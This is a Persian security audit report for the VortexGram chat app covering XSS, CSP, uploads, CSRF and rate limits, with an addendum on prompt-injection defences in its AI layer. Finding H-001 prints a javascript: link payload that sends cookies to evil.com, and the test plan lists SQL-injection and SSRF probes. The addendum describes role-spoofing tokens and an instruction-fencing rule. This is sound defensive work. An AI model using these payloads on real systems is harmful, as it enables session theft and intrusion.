# 🔒 گزارش ممیزی امنیتی VORTEXGRAM

**تاریخ:** ۲۰۲۶/۰۹/۲۸
**ممیز:** Security Auditor (فقط‌خواندنی)
**وضعیت:** به‌روزرسانی فاز ۱ — موارد امنیتی زیر در کد اعمال و با تست رگرسیون پوشش داده شده‌اند. موارد دست‌نخورده همچنان باز هستند.

---

## 📋 فهرست مطالب

1. [معماری](#معماری)
2. [سطح حمله](#سطح-حمله)
3. [یافته‌های بحرانی](#یافتههای-بحرانی)
4. [یافته‌های بالا](#یافتههای-بالا)
5. [یافته‌های متوسط](#یافتههای-متوسط)
6. [یافته‌های پایین](#یافتههای-پایین)
7. [احراز هویت](#احراز-هویت)
8. [مجوزها و دسترسی](#مجوزها-و-دسترسی)
9. [امنیت API](#امنیت-api)
10. [دیتابیس](#دیتابیس)
11. [XSS](#xss)
12. [CSRF](#csrf)
13. [آپلود فایل](#آپلود-فایل)
14. [WebSocket](#websocket)
15. [محدودیت نرخ](#محدودیت-نرخ)
16. [Secrets و پیکربندی](#secrets-و-پیکربندی)
17. [هدرهای امنیتی](#هدرهای-امنیتی)
18. [منطق کسب‌وکار](#منطق-کسبوکار)
19. [برنامه تست امنیتی](#برنامه-تست-امنیتی)
20. [ترتیب اصلاح پیشنهادی](#ترتیب-اصلاح-پیشنهادی)

---

## معماری

```
┌─────────────────────────────────────────────────────────┐
│                    کلاینت (Browser/App)                  │
│  public/app.js  │  public/index.html  │  public/sw.js   │
└──────────────────────┬──────────────────────────────────┘
                       │ HTTP / WebSocket
┌──────────────────────▼──────────────────────────────────┐
│              Node.js + Express 4.19.2                    │
│                   server.js (2368 خط)                   │
│  ┌─────────┐ ┌──────────┐ ┌────────┐ ┌───────────────┐ │
│  │  Auth   │ │  Routes  │ │  WS    │ │  Middleware   │ │
│  │sessions │ │  /api/*  │ │  ws    │ │  security     │ │
│  └─────────┘ └──────────┘ └────────┘ └───────────────┘ │
│  ┌──────────────────────────────────────────────────┐   │
│  │              db.js (Dual Backend)                │   │
│  │  PostgreSQL (parameterized) │ JSON File (fallback)│   │
│  └──────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────┘
```

**فناوری‌ها:**
- Node.js + Express 4.19.2
- WebSocket: `ws` 8.18.0
- آپلود: `multer` 2.0.1
- دیتابیس: PostgreSQL (parameterized queries) یا JSON file
- احراز هویت: Session-based (in-memory Map + persistent file/DB)
- کلاینت: Vanilla JS + Service Worker + Capacitor (iOS/Android)

---

## سطح حمله

| مسیر | دسترسی | توضیح |
|------|--------|-------|
| `/api/*` | عمومی/احرازشده | REST API — بیشتر مسیرها `auth` می‌خواهند |
| `/uploads/*` | احرازشده | فایل‌های آپلودی — فقط با نشست معتبر |
| `/img/*` | عمومی | تصاویر استاتیک (آواتار/پس‌زمینه) |
| `/app`, `/join/:token` | عمومی | صفحه‌های عمومی (لاگین) |
| WebSocket | احرازشده | با token در پیام `auth` اولیه |
| `data/db.json` | git-tracked | ⚠️ شامل داده‌های کاربران |
| `public/uploads/*` | git-tracked | ⚠️ فایل‌های آپلودی کاربران در تاریخچه git |

---

## یافته‌های بحرانی

### C-001: داده‌های کاربران در Git ردیابی می‌شوند

- **Severity:** CRITICAL
- **File:** `data/db.json`, `data/db.json.bak`, `data/db.json.migrated`
- **Root Cause:** فایل‌های دیتابیس JSON و فایل‌های آپلودی کاربران در مخزن git ردیابی می‌شوند. با وجود `.gitignore` که `data/*` را می‌بلعد، این فایل‌ها قبلاً commit شده‌اند و در تاریخچه git باقی مانده‌اند.
- **Evidence:**
  ```bash
  git ls-files data/ public/uploads/
  # data/db.json
  # data/db.json.bak
  # data/db.json.migrated
  # public/uploads/1787386724426-26f6de55a4.jpg
  # ... (30+ فایل)
  ```
- **Impact:** هر کسی به مخزن دسترسی داشته باشد (یا در صورت leak مخزن) می‌تواند شماره تلفن، هش رمز، پیام‌ها و فایل‌های آپلودی تمام کاربران را ببیند.
- **Recommended Fix:**
  1. فوراً `git rm --cached data/db.json data/db.json.bak data/db.json.migrated` و از آن‌ها در تاریخچه git با `git filter-repo` پاک‌سازی کنید
  2. `public/uploads/` را هم از تاریخچه پاک کنید
  3. `.gitignore` را بررسی کنید — مطمئن شوید `data/*` و `public/uploads/*` به‌درستی کار می‌کنند
  4. اگر مخزن private نیست، فوراً private کنید
- **Regression Test:** `git ls-files data/` و `git ls-files public/uploads/` باید خالی باشند

### C-002: فایل‌های آپلودی کاربران در Git

- **Severity:** CRITICAL
- **File:** `public/uploads/*` (30+ فایل ردیابی‌شده)
- **Root Cause:** مشابه C-001 — فایل‌های رسانه‌ای کاربران در مخزن git قرار دارند
- **Impact:** لو رفتن تصاویر، ویس‌ها و سایر فایل‌های خصوصی کاربران
- **Recommended Fix:** همانند C-001 — از تاریخچه git پاک‌سازی شوند

---

## یافته‌های بالا

### H-001: XSS از طریق `javascript:` URL در `formatText()`

- **Severity:** HIGH
- **Status:** ✅ رفع شد در فاز ۱
- **File:** `public/sanitize.js`، `public/app.js` (تابع `formatText` اکنون به `VXSanitize.formatText` واگذار شده است)
- **Root Cause:** تابع `formatText` ابتدا متن را با `esc()` escape می‌کند، اما سپس در regex لینک‌ها `[text](url)` را به `<a href="$2">` تبدیل می‌کند بدون اینکه پروتکل URL را بررسی کند. از آنجا که `esc()` کاراکترهای HTML را encode می‌کند اما `javascript:alert(1)` کاراکتر ویژه‌ای ندارد، این پروتکل در `href` باقی می‌ماند.
- **Evidence:**
  ```javascript
  // app.js:1012
  s = s.replace(/\[([^\]]+)\]\(([^)]+)\)/g, '<a href="$2" target="_blank" rel="noopener">$1</a>');
  ```
  کاربر می‌تواند پیام زیر را بفرستد:
  ```
  [کلیک کن](javascript:document.location='https://evil.com/?c='+document.cookie)
  ```
- **Impact:** اجرای کد جاوااسکریپت در زمینه قربانی — سرقت توکن نشست از localStorage، ارسال پیام به نام قربانی، دسترسی به تمام داده‌ها
- **Recommended Fix:**
  ```javascript
  s = s.replace(/\[([^\]]+)\]\(([^)]+)\)/g, (m, text, url) => {
    if (!/^(https?:\/\/|\/)/i.test(url)) return m; // فقط http(s) و مسیرهای داخلی
    return '<a href="' + url + '" target="_blank" rel="noopener">' + text + '</a>';
  });
  ```
- **Regression Test:** ارسال پیام با `[test](javascript:alert(1))` و بررسی اینکه `<a>` با `javascript:` ایجاد نشود
- **Phase 1 Fix:** رندر لینک فقط برای `http:`/`https:` معتبر یا مسیر نسبی `/` ساخته می‌شود؛ نام‌کاربری/رمز در URL، `//host`، فاصله، کوتیشن، `<>"'`، بک‌اسلش و کنترل‌های جهت‌نما رد می‌شوند. `href` با `new URL()` اعتبارسنجی و با `encodeURI`/attribute-encoding امن می‌شود. قوانین Markdown داخل `href` اجرا نمی‌شوند و لینک دارای `rel="noopener noreferrer nofollow ugc"` است. همچنین `esc()` اکنون `"` و `'` را هم encode می‌کند و نام آیکون‌های `data-lucide` فقط به `[a-z0-9-]` محدود شده‌اند.
- **Regression Tests:** `security: message markdown links cannot inject JavaScript or attributes` در `tests/security.test.js`

### H-002: `capacitor.config.json` — ناوبری نامحدود و Mixed Content

- **Severity:** HIGH
- **File:** `capacitor.config.json`
- **Evidence:**
  ```json
  {
    "server": {
      "url": "https://66ae722b68435c.lhr.life",
      "allowNavigation": ["*"]
    },
    "android": {
      "allowMixedContent": true
    }
  }
  ```
- **Root Cause:**
  - `allowNavigation: ["*"]` — اپ اجازه می‌دهد به هر URL خارجی ناوبری کند (حتی اگر XSS رخ دهد)
  - `allowMixedContent: true` — اجازه بارگذاری HTTP روی HTTPS (MITM)
  - URL سرور به‌صورت هاردکد در فایل قرار دارد
- **Impact:** در صورت XSS، مهاجم می‌تواند اپ را به هر سمت ببرد. Mixed Content اجازه حملات MITM می‌دهد.
- **Recommended Fix:**
  1. `allowNavigation` را به دامنه‌های مجاز محدود کنید
  2. `allowMixedContent` را روی `false` بگذارید
  3. URL سرور را از متغیر محیطی بخوانید

### H-003: CSP اجازه `'unsafe-inline'` برای اسکریپت‌ها

- **Severity:** HIGH
- **Status:** ✅ رفع شد در فاز ۱
- **File:** `server.js`، `public/landing.html`، `public/privacy.html`، `public/terms.html`، `public/index.html`، `public/landing-theme.js`
- **Evidence:**
  ```javascript
  res.setHeader('Content-Security-Policy',
    "default-src 'self'; script-src 'self' 'unsafe-inline'; ...");
  ```
- **Root Cause:** `'unsafe-inline'` در `script-src` باعث می‌شود CSP در برابر XSS بی‌اثر باشد. هر `<script>` inline یا `onclick=""` اجرا می‌شود.
- **Impact:** حافظه اصلی در برابر XSS غیرفعال می‌شود. تمام تلاش‌های frontend برای escaping بی‌فایده می‌شوند.
- **Recommended Fix:**
  1. `'unsafe-inline'` را از `script-src` حذف کنید
  2. از nonce-based CSP استفاده کنید (هر درخواست nonce تصادفی بگیرد)
  3. اگر حذف ممکن نیست، حداقل `unsafe-eval` را هم اضافه نکنید
- **Regression Test:** بعد از تغییر، مرورگر باید `<script>alert(1)</script>` را inline بلاک کند
- **Phase 1 Fix:** همه‌ی اسکریپت‌های اجرایی inline به فایل‌های same-origin منتقل شدند (`landing-theme.js`) و `onload` ناسازگار با CSP از لینک فونت حذف شد. چون دیگر هیچ اسکریپت inline اجرایی وجود ندارد، از nonce استفاده نشد تا پیچیدگی/سطح حمله‌ی غیرضروری اضافه نشود. `script-src` اکنون فقط `'self'` است.
- **Regression Tests:** `security: pages use a strict script CSP and contain no inline scripts/handlers` به‌علاوه‌ی بررسی headless که اسکریپت/`onclick` تزریقی اجرا نمی‌شود و `securitypolicyviolation` صادر می‌شود.

---

## یافته‌های متوسط

### M-001: SHA-256 fallback برای هش رمز عبور

- **Severity:** MEDIUM
- **File:** `server.js:273-275, 296`
- **Root Cause:** اگر `passHash` کاربر با `scrypt$` شروع نشود، از SHA-256 استفاده می‌کند (خط 296). SHA-256 سریع و قابل بروت‌فورس است.
- **Evidence:**
  ```javascript
  function hash(pw, salt) {
    return crypto.createHash('sha256').update(salt + ':' + pw).digest('hex');
  }
  // verifyPassword line 296:
  return user.passHash !== null && user.passHash === hash(p, user.salt);
  ```
- **Impact:** کاربران قدیمی که هنوز رمزشان مهاجرت نکرده است، در معرض بروت‌فورس قرار دارند
- **Recommended Fix:** کاربران قدیمی را مجبور کنید در اولین ورود رمز خود را تغییر دهند (یا در زمان ورود، هش را به scrypt تبدیل کنید)

### M-002: محدودیت نرخ فقط در حافظه (In-Memory)

- **Severity:** MEDIUM
- **Status:** ⚠️ تا حدی رفع شد در فاز ۱
- **File:** `server.js:128-148`
- **Root Cause:** تمام Mapهای rate-limit (`authAttempts`, `wsRateLimits`, `wsConnTimes`, `uploadUsage`) در حافظه پروسه قرار دارند. با ری‌استارت سرور یا در چند instance، ریست می‌شوند.
- **Impact:** مهاجم می‌تواند با ری‌استارت سرور یا استفاده از چند IP، rate-limit را دور بزند
- **Recommended Fix:** از Redis یا یک لایه مشترک برای rate-limit استفاده کنید
- **Phase 1 Fix:** شمارنده‌های مسیرهای حساس (`register`، `login`، `send-code`، `verify-code`، `complete-register`) در `db.rateLimits` ذخیره می‌شوند و از ری‌استارت جان سالم به در می‌برند. `complete-register` هم سقف هم‌ارز `verify-code` برای هر شماره دارد. محدودیت‌های غیرحساس همچنان حافظه‌ای‌اند و هماهنگی چند instance همچنان باز است.
- **Regression Tests:** `security: auth rate limits survive a restart` و `security: complete-register has a restart-safe per-phone limit`

### M-003: توکن نشست در localStorage

- **Severity:** MEDIUM
- **Status:** ❌ باز است؛ در فاز ۱ مدل توکن عوض نشد
- **File:** `public/app.js` (localStorage `ft_token`)
- **Root Cause:** توکن نشست در `localStorage` ذخیره می‌شود که از طریق XSS قابل سرقت است. با این حال، کوکی `ft_sess` دارای `HttpOnly` است.
- **Impact:** در صورت XSS، مهاجم می‌تواند `ft_token` را از localStorage بخواند و تمام حساب را تصاحب کند
- **Recommended Fix:**
  1. از `HttpOnly` cookie به‌جای localStorage برای توکن استفاده کنید (httponly از دسترسی JS جلوگیری می‌کند)
  2. یا حداقل توکن را در sessionStorage بگذارید (با بستن تب پاک می‌شود)
- **Capacitor Impact (پیشنهاد بدون اجرا):** مدل فقط-کوکی در WebView اندروید نیاز به بررسی ماندگاری کوکی بین اجراها، رفتار `SameSite` روی origin سفارشی/فایل، و تغییر همه‌ی `fetch`ها به `credentials: 'include'` دارد؛ همچنین باید محافظت CSRF صریح اضافه شود چون دیگر هدر Bearer دستی ارسال نمی‌شود. این تصمیم برگشت‌ناپذیر/پرخطر است و برای فاز بعد نگه داشته شد.

### M-004: آپلود فایل — اعتبارسنجی فقط بر اساس Extension

- **Severity:** MEDIUM
- **File:** `server.js:739-746, 1459-1469`
- **Root Cause:** `fileFilter` فقط MIME type را بر اساس هدر درخواست بررسی کند (که کلاینت می‌تواند جعل کند). هیچ اعتبارسنجی محتوای فایل (magic bytes) انجام نمی‌شود.
- **Evidence:**
  ```javascript
  fileFilter: (req, file, cb) => cb(null, ['image/jpeg', 'image/png', 'image/webp'].includes(cleanMime(file.mimetype))),
  ```
- **Impact:** مهاجم می‌تواند فایل `.jpg` با محتوای مخرب (مثل HTML/JS) آپلود کند. اگر کاربر دیگری آن را باز کند، XSS اجرا می‌شود
- **Recommended Fix:**
  1. magic bytes فایل را بررسی کنید (مثلاً `FF D8 FF` برای JPEG)
  2. فایل‌های تصویر را با sharp/jimp resize کنید (فرمت دوباره می‌شود)
  3. Content-Type را سرور-side تعیین کنید

### M-005: بدون CSRF Token

- **Severity:** MEDIUM
- **File:** `server.js` (هیچ CSRF protection یافت نشد)
- **Root Cause:** برخلاف `SameSite=Strict` که خوب است، هیچ CSRF token برای درخواست‌های تغییردهنده (POST/PATCH) وجود ندارد. `SameSite=Strict` از CSRF جلوگیری می‌کند اما برای اپ‌های native (Capacitor) که Origin نمی‌فرستند، این محافظت کار نمی‌کند.
- **Impact:** اپ native بدون Origin header — CSRF ممکن است
- **Recommended Fix:** برای مسیرهای حساس، یک CSRF token در header بررسی کنید

---

## یافته‌های پایین

### L-001: کد OTP در پاسخ API (حالت Dev)

- **Severity:** LOW (در production غیرفعال)
- **File:** `server.js:564`
- **Evidence:** `if (devCodeEnabled) out.devCode = code;`
- **Root Cause:** در حالت توسعه (بدون `VX_HIDE_CODE=1`)، کد OTP در پاسخ API برمی‌گردد
- **Impact:** اگر `VX_HIDE_CODE` در production ست نشود، کد ورود لو می‌رود
- **Recommended Fix:** مطمئن شوید `VX_HIDE_CODE=1` در production فعال است

### L-002: هیچ helmet استفاده نمی‌شود

- **Severity:** LOW
- **File:** `server.js`
- **Root Cause:** هدرهای امنیتی به‌صورت دستی تنظیم شده‌اند (که خوب است) اما `helmet` استفاده نمی‌شود
- **Impact:** اگر در آینده route جدیدی اضافه شود، ممکن است هدرها فراموش شوند
- **Recommended Fix:** از `helmet` استفاده کنید یا middleware هدرها را مرکزی نگه دارید

---

## احراز هویت

### نقاط قوت
- ✅ رمز عبور با **scrypt** هش می‌شود (N=16384, r=8, p=1) — استاندارد صنعت
- ✅ کوکی نشست: `HttpOnly; SameSite=Strict; Path=/; Max-Age=...` — خوب
- ✅ توکن نشست: `crypto.randomBytes(32).toString('hex')` — 256 bit تصادفی
- ✅ احراز هویت دو مرحله‌ای (OTP) با rate-limit
- ✅ Session sliding ۱۴ روزه با سقف مطلق ۶۰ روزه
- ✅ خروج از سمت سرور: هر دو نشست Bearer و کوکی حذف می‌شود
- ✅ تغییر رمز و مسدودسازی همه‌ی نشست‌های کاربر را باطل می‌کند

### نقاط ضعف
- ⚠️ SHA-256 fallback برای هش‌های قدیمی (M-001)
- ⚠️ توکن در localStorage (M-003)
- ⚠️ محدودیت‌های حساس auth اکنون در دیتابیس ذخیره می‌شوند، اما همچنان IP-based هستند — در NAT ممکن است کاربران سالم تراز شوند

---

## مجوزها و دسترسی

### نقاط قوت
- ✅ `canAccess(roomId, username)` — بررسی عضویت در اتاق برای هر درخواست
- ✅ `canPost(roomId, username)` — بررسی حق ارسال
- ✅ `isOriginalAdmin()` — فقط ادمین اصلی (از `ADMIN_PHONES`) می‌تواند impersonate/promote/reset-password کند
- ✅ `canInteract()` — بررسی block/allowed قبل از تماس

### نقاط ضعف
- ⚠️ `canAccess` برای DM فقط بررسی می‌کند که username در roomId باشد — اگر کاربر A به B block شده باشد ولی roomId شامل هر دو باشد، دسترسی وجود دارد (خط 370: `otherUser.blocked.includes(username)` — این درست است)

---

## امنیت API

### نقاط قوت
- ✅ Parameterized queries در repositories (SQL injection ندارد)
- ✅ `express.json({ limit: '1mb' })` — محدودیت حجم body
- ✅ `wss.maxPayload = 512 * 1024` — محدودیت حجم WS
- ✅ Input validation برای username (`/^[a-zA-Z0-9_]{3,20}$/`)
- ✅ `MAX_MSG_LEN = 4000` — محدودیت طول پیام
- ✅ SSRF protection در link-preview و GIF ingest: اعتبارسنجی IP در هر هاپ و اتصال فقط به IP پین‌شده

### نقاط ضعف
- ✅ `formatText()` — XSS از طریق `javascript:` URL در فاز ۱ رفع شد (H-001)
- ⚠️ File upload بدون اعتبارسنجی محتوا (M-004)

---

## دیتابیس

### نقاط قوت
- ✅ Parameterized queries در `server/db/repositories.js` — SQL injection ندارد
- ✅ Transaction-based save (`BEGIN`/`COMMIT`/`ROLLBACK`)
- ✅ Dual backend (PostgreSQL + JSON file) با migration

### نقاط ضعف
- ⚠️ `data/db.json` در git ردیابی می‌شود (C-001)
- ⚠️ Session TTL اکنون ۱۴ روز با سقف مطلق ۶۰ روز است
- ✅ گزارش حسابرسی ادمین برای impersonate/promote/ban/reset-password/restrict و خواندن پیام اتاق‌ها اضافه شد
- ✅ باطل‌سازی نشست در تغییر رمز، مسدودسازی و خروج (Bearer + کوکی)

---

## XSS

### نقاط قوت
- ✅ تابع `esc()` کاراکترهای `&<>"'` را encode می‌کند و برای متن و attribute امن است
- ✅ اکثر رندرهای کاربر از `esc()` استفاده می‌کنند
- ✅ CSP سخت‌گیرانه‌ی `script-src 'self'` بدون اسکریپت/handler اجرایی inline

### نقاط ضعف
- ✅ `formatText()` — `javascript:` URL در فاز ۱ رفع شد (H-001)
- ✅ CSP با `'unsafe-inline'` در فاز ۱ رفع شد (H-003)
- ✅ همه‌ی interpolations پویای بررسی‌شده یا با `esc()` امن، یا با DOM property، یا ثابت/عددی هستند

---

## CSRF

- ✅ `SameSite=Strict` — محافظت خوب برای مرورگرها
- ⚠️ اپ native (Capacitor) بدون Origin — CSRF ممکن است (M-005)
- ⚠️ هیچ CSRF token وجود ندارد

---

## آپلود فایل

### نقاط قوت
- ✅ نام فایل تصادفی: `Date.now() + '-' + crypto.randomBytes(5).toString('hex')`
- ✅ محدودیت حجم: 30MB (عادی) / 100MB (پرمیوم)
- ✅ محدودیت تعداد: 60 فایل/ساعت، 400MB/ساعت
- ✅ `/uploads/*` فقط با auth سرو می‌شود
- ✅ `Cache-Control: private` — فایل‌ها در CDN کش نمی‌شوند

### نقاط ضعف
- ⚠️ اعتبارسنجی فقط بر اساس MIME type کلاینت (M-004)
- ⚠️ فایل‌های قدیمی در git (C-002)

---

## WebSocket

### نقاط قوت
- ✅ Origin check: `originAllowed()` — فقط همان هاست مجاز
- ✅ Rate limit اتصال: 8 اتصال/10 ثانیه/IP، حداکثر 12 اتصال همزمان
- ✅ Rate limit پیام: 30 پیام/10 ثانیه/کاربر
- ✅ Auth قبل از هر پیام: `getSession(data.token)`
- ✅ `maxPayload = 512KB`
- ✅ بررسی `canAccess` برای هر پیام history/message/read
- ✅ بررسی block در DM

### نقاط ضعف
- ⚠️ Rate-limit در حافظه (M-002)

---

## محدودیت نرخ

### نقاط قوت
- ✅ تمام مسیرهای حساس rate-limit دارند
- ✅ شمارنده‌های حساس احراز هویت در دیتابیس ذخیره و از ری‌استارت جان سالم به در می‌برند
- ✅ `clientIp()` فقط وقتی `TRUST_PROXY` فعال باشد XFF را می‌خواند (ضد spoofing)
- ✅ تست‌های security.test.js پوشش دارند

### نقاط ضعف
- ⚠️ محدودیت‌های غیرحساس همچنان In-memory هستند — ری‌استارت = ریست
- ⚠️ در چند instance کار نمی‌کند

---

## Secrets و پیکربندی

### نقاط قوت
- ✅ `.env` در `.gitignore` است
- ✅ `.env.example` بدون مقادیر واقعی
- ✅ `render.yaml` بدون secret
- ✅ `Dockerfile` بدون secret

### نقاط ضعف
- ❌ `data/db.json` در git (C-001)
- ❌ `public/uploads/*` در git (C-002)
- ⚠️ `capacitor.config.json` با URL هاردکد (H-002)

---

## هدرهای امنیتی

| هدر | وضعیت | مقدار |
|-----|--------|-------|
| `X-Content-Type-Options` | ✅ | `nosniff` |
| `X-Frame-Options` | ✅ | `DENY` |
| `Referrer-Policy` | ✅ | `strict-origin-when-cross-origin` |
| `X-XSS-Protection` | ✅ | `1; mode=block` |
| `Content-Security-Policy` | ✅ | `script-src 'self'` بدون اسکریپت/handler اجرایی inline |
| `Strict-Transport-Security` | ✅ | `max-age=31536000; includeSubDomains` (فقط HTTPS) |
| `Cache-Control` | ✅ | مناسب برای هر مسیر |

---

## منطق کسب‌وکار

### نقاط قوت
- ✅ سیستم block دوطرفه در DM
- ✅ سیستم rate-limit آپلود (حجم + تعداد)
- ✅ سقف ساخت گروه (2 عادی / 10 پرمیوم)
- ✅ سیستم rename request (تایید ادمین)
- ✅ سیستم report
- ✅ گزارش حسابرسی append-only برای عملیات حساس ادمین

### نقاط ضعف
- ✅ گزارش حسابرسی ادمین در فاز ۱ اضافه شد (بدون محتوای پیام)
- ⚠️ هیچ محدودیتی برای تعداد گروه‌های public وجود ندارد

---

## برنامه تست امنیتی

| # | تست | روش | اولویت |
|---|------|------|--------|
| 1 | XSS از طریق `javascript:` URL در پیام | تست واحد `sanitize.formatText` + بررسی headless | HIGH |
| 2 | CSRF از طریق فرم خارجی | ایجاد HTML با POST به `/api/block` | MEDIUM |
| 3 | IDOR — دسترسی به پیام کاربر دیگر | تغییر roomId در WS `history` | HIGH |
| 4 | بروت‌فورس OTP | ارسال 10 کد اشتباه | MEDIUM |
| 5 | آپلود فایل مخرب | آپلود `.jpg` با محتوای HTML | HIGH |
| 6 | SSRF در link-preview | ریدایرکت hostname عمومی به IP خصوصی + درخواست مستقیم `169.254.169.254` | MEDIUM |
| 7 | Session fixation | استفاده از توکن قدیمی بعد از logout + سقف مطلق نشست | MEDIUM |
| 8 | Rate-limit bypass | ری‌استارت سرور پس از ۸ ثبت‌نام و تلاش نهم | LOW |
| 9 | SQL injection | ارسال `' OR 1=1--` در username | LOW |
| 10 | بررسی git history | `git log --all -- data/db.json` | HIGH |

---

## ترتیب اصلاح پیشنهادی

| اولویت | یافته | زمان تخمینی | توضیح |
|--------|--------|-------------|-------|
| 🔴 P0 | C-001, C-002 | ۱ ساعت | پاک‌سازی داده‌ها از git history |
| 🔴 P0 | H-001 | ۳۰ دقیقه | فیلتر `javascript:` در formatText |
| 🟠 P1 | H-002 | ۱ ساعت | اصلاح capacitor.config.json |
| 🟠 P1 | H-003 | ۲ ساعت | حذف `'unsafe-inline'` از CSP |
| 🟡 P2 | M-001 | ۱ ساعت | مهاجرت هش‌های SHA-256 به scrypt |
| 🟡 P2 | M-002 | ۴ ساعت | Redis برای rate-limit |
| 🟡 P2 | M-003 | ۲ ساعت | انتقال توکن به HttpOnly cookie |
| 🟡 P2 | M-004 | ۲ ساعت | اعتبارسنجی magic bytes فایل |
| 🟢 P3 | M-005 | ۲ ساعت | افزودن CSRF token |
| 🟢 P3 | L-001 | ۱۵ دقیقه | بررسی VX_HIDE_CODE در production |
| 🟢 P3 | L-002 | ۱ ساعت | افزودن helmet |

---

## خلاصه اجمالی

| سطح | تعداد | موارد |
|------|--------|-------|
| CRITICAL | 2 | داده‌های کاربران در git |
| HIGH | 1 | capacitor config (H-002 باقی‌مانده) |
| MEDIUM | 5 | SHA-256 fallback، localStorage token، آپلود بدون اعتبارسنجی محتوا، CSRF، محدودیت غیرحساس حافظه‌ای/چند instance |
| LOW | 2 | OTP در پاسخ، بدون helmet |

**وضعیت فاز ۱:** H-001 و H-003 رفع شدند؛ M-002 برای مسیرهای حساس احراز هویت رفع شد. C-001/C-002، H-002، M-001، M-003، M-004، M-005، L-001 و L-002 همچنان باز هستند. امتیاز عددی بازمحاسبه نشده است.

**توصیه:** اولویت اصلی پاک‌سازی داده‌ها از تاریخچه git است.

---

*این گزارش پس از فاز ۱ به‌روزرسانی شده است.*

---

# افزودهٔ فاز ۳ — لایهٔ ارائه‌دهندگان هوش مصنوعی (AI)

این بخش پس از بازطراحی `ai/` اضافه شده است. وضعیت پیش از فاز ۳ در بالای همین سند است.

## جدول یافته‌ها

| شناسه | یافته | شدت | وضعیت |
|------|-------|------|-------|
| A-001 | نشت دستورالعمل سیستم به ارائه‌دهنده از راه محتوای چت | HIGH | **رفع شد** |
| A-002 | prompt injection از راه پیام‌های کاربر/تاریخچهٔ چت | HIGH | **رفع شد** |
| A-003 | نبود ممیزی محتوا روی ورودی و خروجی مدل | HIGH | **رفع شد** |
| A-004 | امکان خرج دوبارهٔ سهمیه با درخواست‌های هم‌زمان (double spend) | MEDIUM | **رفع شد** |
| A-005 | یک ارائه‌دهندهٔ مرده می‌توانست درخواست را بی‌نهایت نگه دارد | MEDIUM | **رفع شد** |
| A-006 | نشت کلید API در متن پاسخ مدل | MEDIUM | **رفع شد** |
| A-007 | خروجی بدون سقف طول (پیام بسیار بلند در DB/UI) | LOW | **رفع شد** |
| A-008 | retry با sleep؛ هدر رفت زمان کاربر | LOW | **رفع شد** |
| A-009 | ارسال محتوای گفتگوی خصوصی بدون کنش صریح کاربر | MEDIUM | **رفع شد** |
| A-010 | مدل پیش‌فرض ازکارافتادهٔ Groq | LOW | **رفع شد** |

## توضیح و راهکار

### A-001 / A-002 — جداسازی دستور از داده
`ai/safety.js` تابع `safeMessages(system, data)` را ارائه می‌کند: دستورالعمل سیستم در پیام
`system` جداگانه می‌ماند و همهٔ داده‌های غیرقابل‌اعتماد (تاریخچهٔ چت، متن کاربر، محتوای وب)
داخل بلوک قفسه‌بندی‌شده با هشدار صریح «دستور تلقی نکن» قرار می‌گیرند. نشانه‌های جعل نقش
(`<system>`، `[INST]`، `<|im_start|>`، `system:`) و نویسه‌های نامرئی/بیدت‌جهت پیش از قفسه‌بندی حذف می‌شوند.
آزمون‌های خصم‌آمیز در `tests/ai.test.js` این رفتار را تثبیت می‌کنند.

### A-003 — ممیزی قطعی فارسی + انگلیسی
لایهٔ ممیزی **قطعی و آفلاین** است (نه وابسته به نظر مدل) و پیش از هر فراخوانی روی ورودی و پس از
فراخوانی روی خروجی اجرا می‌شود. دسته‌ها: آسیب به خود، نفرت‌آمیزی، بزرگسال، اطلاعات خصوصی،
افشای پرامپت سیستم/کلید. نرمال‌سازی پیش از تطبیق: حذف نویسهٔ نامرئی و اعراب، یکسان‌سازی
ی/ک عربی و ارقام فارسی، و نسخهٔ بدون فاصله برای دور زدن با حروف‌چینی جدا.
**محدودیت:** این یک لایهٔ واژگانی است و جایگزین یک طبقه‌بند محتوای زبانی واقعی نیست؛
برای پوشش عمیق‌تر، افزودن طبقه‌بند معنایی در کنار آن توصیه می‌شود.

### A-004 — سهمیهٔ اتمی
`ai/quota.js`: شمارنده‌ها در همان شیء `db` نگه‌داری می‌شوند و بررسی و کسر هر دو **همگام** و
بدون `await` بینشان انجام می‌شود؛ پس دو درخواست هم‌زمان نمی‌توانند هر دو «یکی مانده» ببینند.
آزمون «۲۵ درخواست هم‌زمان با سقف ۱» فقط یک مجوز می‌دهد.
**محدودیت:** اتمی بودن در سطح یک پروسه است. با اجرای چند نمونه (multi-instance) روی یک
پایگاه‌دادهٔ مشترک، این تضمین از بین می‌رود و به قفل پایگاه‌داده یا شمارندهٔ بیرونی نیاز است.

### A-005 / A-008 — مدار برق و failover فوری
`ai/reliability.js`: پس از `AI_CIRCUIT_FAILURES` خطای پشت‌سرهم، مدار باز می‌شود و آن ارائه‌دهنده
بدون هیچ درخواست HTTP کنار گذاشته می‌شود؛ پس از cooldown به حالت نیمه‌باز می‌رود.
روی ۴۲۹/۵xx زنجیره **بلافاصله** به ارائه‌دهندهٔ بعدی می‌رود؛ تنها حالتِ تک‌ارائه‌دهنده یک‌بار
با عقب‌نشینی نمایی و jitter دوباره تلاش می‌کند.

### A-006 / A-007 — نشت کلید و سقف خروجی
`guardOutput` الگوهای `sk-`/`gsk_`/`AIza`/`xai-` را با `[redacted]` جایگزین می‌کند و خروجی
را روی `AI_OUTPUT_MAX_CHARS` (پیش‌فرض ۲۰۰۰) برش می‌دهد.

### A-009 — حریم خصوصی
محتوای گفتگو فقط از مسیر `aiComplete()` عبور می‌کند و هر دو فراخوانی آن (دستورهای `@ai` و
پاسخ خودکار در چت ربات) کنش صریح کاربر در همان گفتگو هستند. مسیر `/api/ai` برای
`translate` و `rewrite` اصلاً تاریخچهٔ گفتگو را نمی‌فرستد و برای `summarize`/`reply`/`ask`
بررسی `canAccess` حفظ شده است (و **پیش از** بررسی «تنظیم نشده» انجام می‌شود تا وضعیت سرویس
لو نرود). متن صفحهٔ حریم خصوصی به‌روزرسانی شد.

### A-010 — مدل ازکارافتاده
پیش‌فرض `qwen/qwen3.6-27b` روی Groq در ۱۴ سپتامبر ۲۰۲۶ خاموش شده بود؛ پیش‌فرض به
`qwen/qwen3.8-27b` تغییر کرد و فرضِ مدل جایگزین `allam-2-7b` حذف شد. همهٔ نام مدل‌ها از
متغیر محیطی خوانده می‌شوند.

### A-010b — اصلاح ضمنی در پاک‌سازی پاسخ
`cleanReply` قبلاً با `/^OK\s*[:.]?\s*/i` هر پاسخی که با «ok» شروع می‌شد را خالی می‌کرد
(شامل «okay») و زنجیره آن را «پاسخ خالی» می‌شمرد و به ارائه‌دهندهٔ بعدی می‌رفت. حالا
